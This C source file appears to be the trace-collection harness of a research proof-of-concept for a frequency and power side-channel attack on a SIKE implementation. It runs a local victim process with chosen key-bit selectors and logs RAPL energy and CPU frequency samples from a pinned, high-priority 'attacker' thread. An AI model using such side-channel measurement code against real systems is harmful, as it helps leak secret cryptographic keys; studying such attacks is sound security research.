#include <sys/resource.h>

#include "../../util/freq-utils.h"
#include "../../util/rapl-utils.h"
#include "../../util/util.h"

volatile static int attacker_core_ID;

#define TIME_BETWEEN_MEASUREMENTS 1000000L // 1 millisecond

struct args_t {
	uint64_t iters;
	int flipkey;
	int keyindex;
	int bitindex;
	int number_thread;
};

// Adds necessary background system load
static void victim(void *command)
{
	system((char *)command);
}

// Collects traces
static __attribute__((noinline)) int monitor(void *in)
{
	static int rept_index = 0;

	struct args_t *arg = (struct args_t *)in;

	// Pin monitor to a single CPU
	pin_cpu(attacker_core_ID);

	// Set filename
	// The format is, e.g., ./out/all_02_2330.out
	// where 02 is the selector and 2330 is an index to prevent overwriting files
	char output_filename[64];
	sprintf(output_filename, "./out/all_%01d_%02d_%03d_%05d_%06d.out", arg->flipkey, arg->keyindex, arg->bitindex, arg->number_thread, rept_index);
	rept_index += 1;

	// Prepare output file
	FILE *output_file = fopen((char *)output_filename, "w");
	if (output_file == NULL) {
		perror("output file");
	}

	// Prepare
	double energy, prev_energy = rapl_msr(attacker_core_ID, PP0_ENERGY);
	struct freq_sample_t freq_sample, prev_freq_sample = frequency_msr_raw(attacker_core_ID);

	// Collect measurements
	for (uint64_t i = 0; i < arg->iters; i++) {

		// Wait before next measurement
		nanosleep((const struct timespec[]){{0, TIME_BETWEEN_MEASUREMENTS}}, NULL);

		// Collect measurement
		energy = rapl_msr(attacker_core_ID, PP0_ENERGY);
		freq_sample = frequency_msr_raw(attacker_core_ID);

		// Store measurement
		uint64_t aperf_delta = freq_sample.aperf - prev_freq_sample.aperf;
		uint64_t mperf_delta = freq_sample.mperf - prev_freq_sample.mperf;
		uint32_t khz = (maximum_frequency * aperf_delta) / mperf_delta;
		fprintf(output_file, "%.15f %" PRIu32 "\n", energy - prev_energy, khz);

		// Save current
		prev_energy = energy;
		prev_freq_sample = freq_sample;
	}

	// Clean up
	fclose(output_file);
	return 0;
}

int main(int argc, char *argv[])
{
	// Check arguments
	if (argc != 3) {
		fprintf(stderr, "Wrong Input! Enter: %s <samples> <outer>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	// Read in args
	struct args_t arg;
	int outer;
	sscanf(argv[1], "%" PRIu64, &(arg.iters));
	sscanf(argv[2], "%d", &outer);
	if (outer < 0) {
		fprintf(stderr, "outer cannot be negative!\n");
		exit(1);
	}

	// Open the selector file
	FILE *selectors_file = fopen("input.txt", "r");
	if (selectors_file == NULL)
		perror("fopen error");

	// Read the selectors file line by line
	int num_selectors = 0;
	int flipkey[100];
	int keyindex[100];
	int bitindex[100];
	int number_thread[100];
	size_t len = 0;
	ssize_t read = 0;
	char *line = NULL;
	while ((read = getline(&line, &len, selectors_file)) != -1) {
		if (line[read - 1] == '\n')
			line[--read] = '\0';

		// Read selector
		sscanf(line, "%d %d %d %d", &(flipkey[num_selectors]), &(keyindex[num_selectors]), &(bitindex[num_selectors]), &(number_thread[num_selectors]));
		num_selectors += 1;
	}

	// Set the scheduling priority to high to avoid interruptions
	// (lower priorities cause more favorable scheduling, and -20 is the max)
	setpriority(PRIO_PROCESS, 0, -20);

	// Prepare up monitor/attacker
	attacker_core_ID = 0;
	set_frequency_units(attacker_core_ID);
	frequency_msr_raw(attacker_core_ID);
	set_rapl_units(attacker_core_ID);
	rapl_msr(attacker_core_ID, PP0_ENERGY);

	// Run experiment once for each selector
	for (int i = 0; i < outer * num_selectors; i++) {

		// Set alternating selector
		arg.flipkey = flipkey[i % num_selectors];
		arg.keyindex = keyindex[i % num_selectors];
		arg.bitindex = bitindex[i % num_selectors];
		arg.number_thread = number_thread[i % num_selectors];

		// Prepare for experiments
		pthread_t thread1, thread2;

		// Prepare background stress command
		char command[256];
		sprintf(command, "../circl/dh/sidh/POC_ATTACK/sike_local %d %d %d %d 1000000000", arg.flipkey, arg.keyindex, arg.bitindex, arg.number_thread);
		printf("Running: %s\n", command);

		// Start LOCAL
		pthread_create(&thread1, NULL, (void *)&victim, (void *)command);

		// Wait 35 seconds before starting the monitor
		sleep(35);

		// Start monitor
		pthread_create(&thread2, NULL, (void *)&monitor, (void *)&arg);

		// Wait for monitor to be done
		pthread_join(thread2, NULL);

		// Stop stress
		system("pkill -f sike_local");

		// Join stress
		pthread_join(thread1, NULL);
	}
}
